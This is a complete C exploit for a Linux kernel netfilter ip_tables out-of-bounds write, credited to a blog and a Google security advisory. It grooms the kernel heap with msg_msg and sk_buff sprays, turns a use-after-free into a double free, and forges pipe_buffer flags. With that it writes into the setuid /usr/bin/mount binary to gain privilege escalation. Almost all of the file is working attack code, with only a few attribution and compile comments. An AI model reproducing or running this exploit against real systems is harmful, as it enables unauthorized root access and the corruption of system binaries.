// https://www.cjovi.icu/pwnreview/1659.html
// gcc -m32 -static exp.c -o exp
#define _GNU_SOURCE
#include <fcntl.h>
#include <assert.h>
#include <unistd.h>
#include <sched.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <net/if.h>
#include <netinet/in.h>
#include <linux/netfilter_ipv4/ip_tables.h>

struct list_head {
  u_int64_t next, prev;
};

struct msg_msgseg {
  u_int64_t next;
  /* the next part of the message follows immediately */
};

struct msg_msg {
  struct list_head m_list;
  u_int64_t m_type;
  u_int64_t m_ts;  /* message text size */
  u_int64_t next;  // struct msg_msgseg*
  u_int64_t security;
  /* the actual message follows immediately */
};

struct pipe_buffer {
  u_int64_t page;
  u_int32_t offset, len;
  uint64_t ops;
  uint32_t flags;
  uint64_t private;
} __attribute__((aligned(8)));

#define FIRST_MSG_SIZE (0x1000 - sizeof(struct msg_msg))
#define SECOND_MSG_SIZE (0x400 - sizeof(struct msg_msg))
#define SOCKET_SUM 16
#define PIPE_SUM 256
#define SK_BUFF_IN_ONE_SOCKET 128
#define N_SPRAY_MSGMSG 0x2000

struct first_msg {
  long message_type;
  u_int8_t message[FIRST_MSG_SIZE];
};

struct second_msg {
  long message_type;
  u_int8_t message[SECOND_MSG_SIZE];
};

int msgids[N_SPRAY_MSGMSG];

char buf[FIRST_MSG_SIZE * 2];

void cleanup_msgs() {
  printf("[!] cleaning up msg_msg..\n");
  for (int i = 0; i < N_SPRAY_MSGMSG; i++) {
    msgctl(msgids[i], IPC_RMID, NULL);
  }
}

void err_exit(const char *str) {
  perror(str);
  cleanup_msgs();
  exit(1);
}

void secondMsgSend(int msgid, const char *content, int msgtype) {
  struct second_msg msg;
  msg.message_type = msgtype;
  memcpy(msg.message, content, SECOND_MSG_SIZE);
  if (msgsnd(msgid, &msg, SECOND_MSG_SIZE, 0)) {
    err_exit("[-] msgsnd");
  }
}

void firstMsgSend(int msgid, const char *content, int msgtype) {
  struct first_msg msg;
  msg.message_type = msgtype;
  memcpy(msg.message, content, FIRST_MSG_SIZE);
  if (msgsnd(msgid, &msg, FIRST_MSG_SIZE, 0)) {
    err_exit("[-] msgsnd");
  }
}

void triggerOob(int socket_fd) {
  // adapted from
  // https://github.com/google/security-research/security/advisories/GHSA-xxx5-8mvq-3528
  struct __attribute__((__packed__)) {
    struct ipt_replace replace;
    struct ipt_entry entry;
    struct xt_entry_match match;
    char pad[0xFB6 - 172 - 4];
    struct xt_entry_target target;
  } data = {0};

  data.replace.num_counters = 1;
  data.replace.num_entries = 1;
  data.replace.size = sizeof(data.entry) + sizeof(data.match) +
                      sizeof(data.pad) + sizeof(data.target);

  data.entry.next_offset = sizeof(data.entry) + sizeof(data.match) +
                           sizeof(data.pad) + sizeof(data.target);
  data.entry.target_offset =
      sizeof(data.entry) + sizeof(data.match) + sizeof(data.pad);

  data.match.u.user.match_size = sizeof(data.match) + sizeof(data.pad);
  strcpy(data.match.u.user.name, "icmp");
  data.match.u.user.revision = 0;

  data.target.u.user.target_size = sizeof(data.target);
  strcpy(data.target.u.user.name, "NFQUEUE");
  data.target.u.user.revision = 1;

  // partial overwrite the next object
  if (setsockopt(socket_fd, SOL_IP, IPT_SO_SET_REPLACE, &data, sizeof(data))) {
    if (errno == ENOPROTOOPT) {
      err_exit("ip_tables module is not loaded!\n");
    }
    printf("error: %d\n", errno);
    perror("[-] setsockopt");
  }
}

int sk_buff_spray(int sk_socket[SOCKET_SUM][2], void *buf, size_t size) {
  for (int i = 0; i < SOCKET_SUM; i++) {
    for (int j = 0; j < SK_BUFF_IN_ONE_SOCKET; j++) {
      if (write(sk_socket[i][0], buf, size) != size) {
        perror("[-] write sk_buff");
        return -1;
      }
    }
  }
  return 0;
}

int sk_buff_free(int sk_socket[SOCKET_SUM][2], void *buf, size_t size) {
  for (int i = 0; i < SOCKET_SUM; i++) {
    for (int j = 0; j < SK_BUFF_IN_ONE_SOCKET; j++) {
      if (read(sk_socket[i][1], buf, size) != size) {
        perror("[-] read sk_buff");
        return -1;
      }
    }
  }
  return 0;
}

int main() {
  if (unshare(CLONE_NEWUSER)) {
    err_exit("[-] unshare(CLONE_NEWUSER)");
  }
  if (unshare(CLONE_NEWNET)) {
    err_exit("[-] unshare(CLONE_NEWNET)");
  }

  int socket_fd;
  int sk_sockets[SOCKET_SUM][2];
  int pipe_fds[PIPE_SUM][2];
  if ((socket_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
    err_exit("[-] socket");
  }
  for (int i = 0; i < SOCKET_SUM; i++) {
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sk_sockets[i]) < 0) {
      err_exit("[-] socketpair");
    }
  }

  // https://stackoverflow.com/questions/280909/how-to-set-cpu-affinity-for-a-process-from-c-or-c-in-linux
  cpu_set_t cpu_mask;
  CPU_ZERO(&cpu_mask);
  CPU_SET(0, &cpu_mask);
  if (sched_setaffinity((__pid_t)0, 1, (const cpu_set_t *)&cpu_mask)) {
    err_exit("[-] sched_setaffinity");
  }

  memset(buf, 0x00, sizeof(buf));
  // spray heap with msg_msg
  printf("[!] start msg_msg spraying..\n");
  for (int i = 0; i < N_SPRAY_MSGMSG; i++) {
    msgids[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    if (msgids[i] < 0) {
      err_exit("[-] msgget");
    }
  }
  for (int i = 0; i < N_SPRAY_MSGMSG; i++) {
    firstMsgSend(
        msgids[i], buf,
        N_SPRAY_MSGMSG * 2 + i);  // this id is for the sake of debugging
  }

  for (int i = 0; i < N_SPRAY_MSGMSG; i++) {
    ((int *)buf)[0] = i;
    secondMsgSend(msgids[i], buf, 1);
  }
  printf("[+] msg_msg spraying done!\n");

#define HOLE_STEP 0x200
  for (int i = N_SPRAY_MSGMSG / 2 + HOLE_STEP; i < N_SPRAY_MSGMSG;
       i += HOLE_STEP) {
    msgrcv(msgids[i], buf, FIRST_MSG_SIZE, 0, 0);
  }

  // oob
  printf("[!] triggering oob\n");
  triggerOob(socket_fd);

  // find the msg that can be uaf
  int first_id = -1, second_id = -1;
  for (int i = 0; i < N_SPRAY_MSGMSG; i++) {
    if (i % HOLE_STEP == 0) {
      continue;
    }
    if (msgrcv(msgids[i], buf, SECOND_MSG_SIZE, 1, MSG_COPY | IPC_NOWAIT) < 0) {
      err_exit("[-] msgrcv");
    }
    if (((int *)buf)[1] != i) {
      first_id = i;
      second_id = ((int *)buf)[1];
      printf("[+] found UAF target: first id 0x%x, second id 0x%x\n", first_id,
             second_id);
    }
  }

  if (first_id == -1) {
    err_exit("[-] failed to oob msg_msg");
  }

  // create a UAF, start sk_buff spray
  if (msgrcv(msgids[second_id], &buf, SECOND_MSG_SIZE, 1, 0) < 0) {
    err_exit("[-] msgrcv");
  }

  char fake_msg_buf[0x400 - 320];
  struct msg_msg *fake_msg = (struct msg_msg *)fake_msg_buf;
  fake_msg->m_list.next = 0xAAAAAAAAAAAAAAAA;
  fake_msg->m_list.prev = 0xBBBBBBBBBBBBBBBB;
  fake_msg->next = 0;
  fake_msg->m_ts = FIRST_MSG_SIZE;
  fake_msg->m_type = 2;
  fake_msg->security = 0;
  if (sk_buff_spray(sk_sockets, fake_msg_buf, sizeof(fake_msg_buf)) < 0) {
    err_exit("[-] failed to spray sk_buff");
  }
  printf("[+] spray sk_buff done!\n");

  // oob read second msg
  if (msgrcv(msgids[first_id], &buf, FIRST_MSG_SIZE, 1, MSG_COPY | IPC_NOWAIT) <
      0) {
    err_exit("[-] msgrcv");
  }
  printf("[+] successfully oob read\n");

  struct msg_msg *next_msg_ptr = (struct msg_msg *)&buf[SECOND_MSG_SIZE + 4];
  printf("[+] heap leaked prev_ptr 0x%llx next_ptr 0x%llx\n",
         next_msg_ptr->m_list.prev, next_msg_ptr->m_list.next);

  // start leaking UAFed object address
  assert(sizeof(buf) > sizeof(fake_msg_buf));
  if (sk_buff_free(sk_sockets, buf, sizeof(fake_msg_buf)) < 0) {
    err_exit("[-] freeing sk_buff");
  }

  u_int64_t some_heap_address = next_msg_ptr->m_list.prev;

  // !!! you don't need to leak the UAFed object's address at all!
  //  fake_msg->next = next_msg_ptr->m_list.prev - 8;
  //  fake_msg->m_ts = FIRST_MSG_SIZE + 0x1000 - sizeof(struct msg_msgseg);
  //  // spray again..
  //  if (sk_buff_spray(sk_sockets, fake_msg_buf, sizeof(fake_msg_buf)) < 0) {
  //    err_exit("[-] failed to spray sk_buff");
  //  }
  //
  //  if (msgrcv(msgids[first_id], &buf, fake_msg->m_ts, 1, MSG_COPY |
  //  IPC_NOWAIT) <
  //      0) {
  //    err_exit("[-] msgrcv");
  //  }
  //  u_int64_t uaf_object_addr =
  //      ((u_int64_t *)((char *)buf + FIRST_MSG_SIZE + 4))[0] - 0x400;
  //  printf("[+] UAF object address: 0x%llx\n", uaf_object_addr);

  // fix UAFed object to double free it
  fake_msg->m_list.next = some_heap_address + 0x800;
  fake_msg->m_list.prev = some_heap_address + 0x800;
  fake_msg->next = 0;
  fake_msg->m_ts = SECOND_MSG_SIZE;
  fake_msg->security = 0;
  fake_msg->m_type = 1;
  // if (sk_buff_free(sk_sockets, buf, sizeof(fake_msg_buf)) < 0) {
  //    err_exit("[-] freeing sk_buff");
  // }
  if (sk_buff_spray(sk_sockets, fake_msg_buf, sizeof(fake_msg_buf)) < 0) {
    err_exit("[-] failed to spray sk_buff");
  }
  if (msgrcv(msgids[first_id], &buf, SECOND_MSG_SIZE, 1, 0) < 0) {
    err_exit("[-] msgrcv");
  }
  printf("[+] double free done!\n");

  // spray pipe_buffer
  for (int i = 0; i < PIPE_SUM; i++) {
    if (pipe(pipe_fds[i]) < 0) {
      err_exit("[-] pipe");
    }
    if (write(pipe_fds[i][1], "AAAAAAAA", 8) != 8) {
      err_exit("[-] write pipe");
    }

    // pipe primitve
    int suid_fd = open("/usr/bin/mount", O_RDONLY);
    if (suid_fd < 0) {
      err_exit("[-] open suid");
    }

    // mount.main@0x1775
    off64_t offset = 0x1775 - 1;  // we will read one byte
    if (splice(suid_fd, &offset, pipe_fds[i][1], NULL, 1, 0) < 0) {
      err_exit("[-] splice");
    }
  }

  printf("[+] pipe spray done!\n");

  int found = -1;
  char pipe_buf[0x400 - 320];
  for (int i = 0; i < SOCKET_SUM; i++) {
    for (int j = 0; j < SK_BUFF_IN_ONE_SOCKET; j++) {
      if (read(sk_sockets[i][1], fake_msg_buf, sizeof(fake_msg_buf)) !=
          sizeof(fake_msg_buf)) {
        perror("[-] write sk_buff");
        return -1;
      }
      struct pipe_buffer *pipe_buffer_ptr = (void *)fake_msg_buf;
      if (pipe_buffer_ptr->ops > 0xffffffff81000000) {
        memcpy(pipe_buf, fake_msg_buf, sizeof(pipe_buf));
        printf("[+] found pipe_buffer, ops: 0x%llx\n", pipe_buffer_ptr->ops);
        found = 1;
      }
    }
  }
  if (found != 1) {
    err_exit("[-] failed to find pipe_buffer");
  }

  struct pipe_buffer *pipe_buf_ptr = (void *)pipe_buf;
  for (int i = 0; i < 16; i++) {
#define PIPE_BUF_FLAG_CAN_MERGE 0x10 /* can merge buffers */
    pipe_buf_ptr[i].flags |= PIPE_BUF_FLAG_CAN_MERGE;
  }
  if (sk_buff_spray(sk_sockets, pipe_buf_ptr, sizeof(fake_msg_buf)) < 0) {
    err_exit("[+] sk_buff_spray");
  }
  printf("[!] changed pipe_buffer flag\n");

  printf("[!] writing to pipe\n");
  for (int i = 0; i < PIPE_SUM; i++) {
    if (write(pipe_fds[i][1], "\xCC\xCC\xCC", 3) < 0) {
      perror("write pipe");
    }
  }

  return 0;
}
